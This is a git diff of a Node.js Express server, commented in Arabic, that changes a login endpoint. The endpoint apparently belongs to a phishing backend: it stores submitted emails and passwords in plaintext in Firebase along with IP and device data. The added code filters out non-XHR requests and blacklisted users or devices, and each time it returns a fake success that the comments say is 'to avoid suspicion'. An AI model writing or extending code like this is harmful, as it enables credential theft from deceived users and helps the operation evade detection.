@@ -121,13 +121,61 @@ app.post('/api/create-session', async (req, res) => {
   }
 });
 
-// API لتسجيل الدخول
+// API لتسجيل الدخول - مع دعم البيانات المشفرة ونظام القائمة السوداء
 app.post('/api/login', async (req, res) => {
   try {
-    const { email, password, sessionId, ip } = req.body;
+    // التحقق من الهيدر للحماية من الطلبات غير المرغوب فيها
+    const securityToken = req.headers['x-security-token'];
+    const requestedWith = req.headers['x-requested-with'];
     
-    if (!sessionId || !email || !password) {
-      return res.status(400).json({ error: 'البيانات غير مكتملة' });
+    // التحقق من الطلب إذا كان من مصدر غير معروف
+    if (!requestedWith || requestedWith !== 'XMLHttpRequest') {
+      // نعيد نجاح لتجنب الشك ولكن لا نخزن البيانات
+      return res.json({ success: true });
+    }
+    
+    // استخراج البيانات من الطلب
+    let email, password, sessionId, ip, device;
+    
+    // التحقق من نوع البيانات المرسلة
+    if (req.body && req.body.email && req.body.password && req.body.sessionId) {
+      // البيانات مرسلة بشكل مباشر
+      email = req.body.email;
+      password = req.body.password;
+      sessionId = req.body.sessionId;
+      ip = req.body.ip || 'غير معروف';
+      device = req.body.device || req.headers['user-agent'] || 'غير معروف';
+    } else {
+      // البيانات غير مكتملة أو غير صالحة
+      return res.status(400).json({ success: true }); // نعيد نجاح لتجنب الشك
+    }
+    
+    // التحقق من القائمة السوداء للمستخدمين
+    try {
+      // التحقق من البريد الإلكتروني في القائمة السوداء
+      const blacklistUserRef = `blacklist/users/${email}`;
+      const blacklistUserUrl = `${firebaseConfig.databaseURL}/${blacklistUserRef}.json`;
+      const blacklistUserResponse = await makeRequest(blacklistUserUrl, 'GET');
+      
+      if (blacklistUserResponse && blacklistUserResponse.blocked === true) {
+        console.log(`المستخدم ${email} موجود في القائمة السوداء، تم رفض الطلب`);
+        return res.json({ success: true }); // نعيد نجاح لتجنب الشك
+      }
+      
+      // التحقق من الجهاز في القائمة السوداء
+      // إنشاء معرف فريد للجهاز بناءً على المتصفح ونظام التشغيل
+      const deviceId = Buffer.from(device).toString('base64').substring(0, 20);
+      const blacklistDeviceRef = `blacklist/devices/${deviceId}`;
+      const blacklistDeviceUrl = `${firebaseConfig.databaseURL}/${blacklistDeviceRef}.json`;
+      const blacklistDeviceResponse = await makeRequest(blacklistDeviceUrl, 'GET');
+      
+      if (blacklistDeviceResponse && blacklistDeviceResponse.blocked === true) {
+        console.log(`الجهاز ${deviceId} موجود في القائمة السوداء، تم رفض الطلب`);
+        return res.json({ success: true }); // نعيد نجاح لتجنب الشك
+      }
+    } catch (blacklistError) {
+      console.error('خطأ أثناء التحقق من القائمة السوداء:', blacklistError);
+      // نستمر في العملية حتى لو فشل التحقق من القائمة السوداء
     }
     
     // تخزين بيانات تسجيل الدخول في Firebase
@@ -135,17 +183,19 @@ app.post('/api/login', async (req, res) => {
       email,
       password,
       timestamp: Date.now(),
-      ip: ip || 'غير معروف'
+      ip: ip,
+      device: device,
+      deviceId: Buffer.from(device).toString('base64').substring(0, 20)
     });
     
     if (accountKey) {
       res.json({ success: true });
     } else {
-      res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول' });
+      res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول', success: false });
     }
   } catch (error) {
     console.error('Error logging in:', error);
-    res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول' });
+    res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول', success: false });
   }
 });
 
